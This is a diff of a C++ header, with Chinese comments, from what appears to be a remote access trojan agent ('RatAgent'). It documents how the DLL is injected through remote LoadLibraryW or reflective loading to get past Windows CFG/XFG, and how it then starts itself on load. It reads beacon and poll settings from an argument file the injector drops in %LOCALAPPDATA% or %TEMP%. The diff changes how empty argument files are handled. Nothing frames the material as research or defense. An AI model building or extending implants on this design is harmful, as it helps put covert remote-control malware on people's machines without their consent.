@@ -45,20 +45,23 @@ bool agent_redirect_stdout(const std::string& path);
 // 背景：现代 Windows 目标的 CFG/XFG 会拦住"把远程线程入口指向镜像内任意导出"的注入方式
 //（表现为 0xC0000409/__fastfail），但远程 LoadLibraryW 仍然可用；反射加载更是只调用
 // 入口点、完全没有参数通道。因此 DLL 形态采用"加载即自启动"：
-//   1) 有参数文件 <module>.autostart.args（内容 = agent 参数串，与 StartAgent 同语法）
+//   1) 参数文件 <module>.autostart.args **存在且内容非空**（内容 = agent 参数串，与 StartAgent 同语法）
 //      → 用文件里的参数（**优先级最高**）；
-//   2) 没有该文件 → 用内置默认配置（beacon 127.0.0.1:8080、轮询 5s；
+//   2) 文件不存在 / 读取失败 / 内容为空（或全空白）
+//      → 一律视为"未触发"，用内置默认配置（beacon 127.0.0.1:8080、轮询 5s；
 //      <module>.id / 日志落 %LOCALAPPDATA%\RatAgent\）。
-// 参数文件路径（按顺序探测，取第一个存在的）：
+// 参数文件路径（按顺序探测，取第一个**内容非空**的）：
 //   %LOCALAPPDATA%\RatAgent\<module>.autostart.args   （首选；DLL 默认目录）
 //   %TEMP%\RatAgent\<module>.autostart.args
+// 空文件会被跳过并继续探测下一个候选，不会把后面真正带参数的挡掉。
 //
 // ⚠ 自启在 DllMain 之后的新线程上进行（Sleep 300ms 脱离 loader lock），而显式入口
 //（rundll32 的 Start/Stop、宿主的 StartAgent）由加载方紧接着调用，二者存在竞争：
 // 显式入口先到就正常接管；若晚于这 300ms，则会被默认自启抢先——表现为参数被忽略
 //（Start/StartAgent 报 already running）或 Stop 走同进程分支而不再通知目标进程。
 std::string agent_autostart_path();                  // 首选路径（供注入方写入）
-// 读参数文件；存在则回填参数串并返回 true（无文件返回 false，由调用方用默认配置）
+// 读参数文件；**只有文件存在且内容非空**才回填参数串并返回 true
+//（无文件 / 读失败 / 内容为空 → 返回 false，由调用方用默认配置）
 // 只用 Win32 + 栈缓冲，可在 DllMain 的 loader lock 下安全调用
 bool agent_autostart_requested(std::string& args);
 
